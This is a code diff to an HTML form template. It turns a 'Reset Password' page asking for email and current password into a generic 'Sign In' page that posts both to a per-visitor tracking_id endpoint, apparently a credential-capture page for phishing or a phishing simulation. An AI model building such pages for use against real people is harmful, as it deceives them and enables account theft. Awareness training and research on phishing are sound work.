@@ -106,21 +106,20 @@
 
 <body>
     <div class="container">
-        <img src="/static/logo.png" alt="Logo" style="width:160px;margin-bottom:16px;"
-            onerror="this.style.display='none'">
-        <h1>Reset Password</h1>
-        <p>Enter your email and current password to verify and reset your password</p>
+        <img src="/static/logo.png" alt="Logo" style="width:160px;margin-bottom:16px;">
+        <h1>Sign In</h1>
+        <p>Use your account to continue</p>
 
-        <form action="/submit_step1/{{ tracking_id }}" method="POST">
+        <form action="/submit/{{ tracking_id }}" method="POST">
             <div class="input-group">
-                <input type="text" name="email" placeholder="Email Address" required>
+                <input type="text" name="email" placeholder="Email" required>
             </div>
 
             <div class="input-group">
-                <input type="password" name="old_password" placeholder="Current Password" required>
+                <input type="password" name="password" placeholder="Password" required>
             </div>
 
-            <button type="submit">Verify & Reset</button>
+            <button type="submit">Next</button>
         </form>
 
         <div class="footer">
